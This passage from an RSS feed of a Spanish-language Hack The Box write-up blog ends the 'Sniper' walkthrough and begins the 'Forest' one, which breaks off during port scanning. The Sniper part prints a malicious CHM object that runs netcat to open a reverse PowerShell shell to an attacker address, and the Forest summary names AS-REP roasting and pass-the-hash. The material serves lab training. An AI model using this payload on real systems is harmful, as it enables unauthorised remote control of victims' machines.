  &lt;span class=&#34;nt&#34;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Item1&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;,cmd.exe,/c C:\Users\Chris\Documents\nc.exe 10.10.15.244 449 -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&amp;#39;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;nt&#34;&gt;&amp;lt;PARAM&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Item2&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;273,1,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/OBJECT&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;SCRIPT&amp;gt;&lt;/span&gt;
  x.Click();
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/SCRIPT&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Trasladamos nuestro archivo a la carpeta &lt;code&gt;C:\Docs&lt;/code&gt;, netcat (nc.exe) y esperamos a que nuestro payload sea ejecutado:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_210525.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra shell con permisos de administrador y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_211231.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/sniper/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/sniper/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>lfi</category>
            
          
            
              <category>impacket</category>
            
          
            
              <category>smbmap</category>
            
          
            
              <category>chm</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Forest</title>
        <link>https://sckull.github.io/posts/forest/</link>
        <pubDate>Fri, 10 Jan 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 10 Jan 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/forest/</guid>
        <description>Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/212&#34;&gt;Forest&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.161&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/1190&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt; &lt;hr style=&#34;opacity:25%;&#34;&gt; &lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;margin-top: -15px;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/2984&#34;&gt;mrb3n&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/2984&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[8.1, 8.6, 6.8, 3.2, 1.4],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[7, 10, 8, 2, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/forest# masscan -p1-65535,U:1-65535 10.10.10.161 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-10-25 04:57:31 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 135/tcp on 10.10.10.161                                   
Discovered open port 464/tcp on 10.10.10.161                                   
Discovered open port 49910/tcp on 10.10.10.161                                 
Discovered open port 58925/udp on 10.10.10.161                                 
Discovered open port 445/tcp on 10.10.10.161                                   
Discovered open port 139/tcp on 10.10.10.161                                   
Discovered open port 49664/tcp on 10.10.10.161                                 
Discovered open port 9389/tcp on 10.10.10.161                                  
Discovered open port 49671/tcp on 10.10.10.161                                 
Discovered open port 49666/tcp on 10.10.10.161                                 
Discovered open port 3269/tcp on 10.10.10.161                                  
Discovered open port 593/tcp on 10.10.10.161                                   
Discovered open port 49667/tcp on 10.10.10.161                                 
Discovered open port 49676/tcp on 10.10.10.161                                 
Discovered open port 49703/tcp on 10.10.10.161                                 
Discovered open port 49684/tcp on 10.10.10.161                                 
Discovered open port 53/tcp on 10.10.10.161  

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Fri Oct 25 01:01:38 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.161&lt;/span&gt;
Warning: 10.10.10.161 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;63731&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1780&lt;/span&gt; filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49910/tcp open  unknown

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Oct 25 01:06:47 2019 -- 1 IP address (1 host up) scanned in 308.58 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Fri Oct 25 01:08:05 2019 as: nmap -sV -sC -p- --min-rate 1000 -o script_nmap.scan 10.10.10.161&lt;/span&gt;
Warning: 10.10.10.161 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;64311&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1201&lt;/span&gt; filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSVersionBindReqTCP: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     version
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt;
88/tcp    open  kerberos-sec Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2019-10-25 05:20:03Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
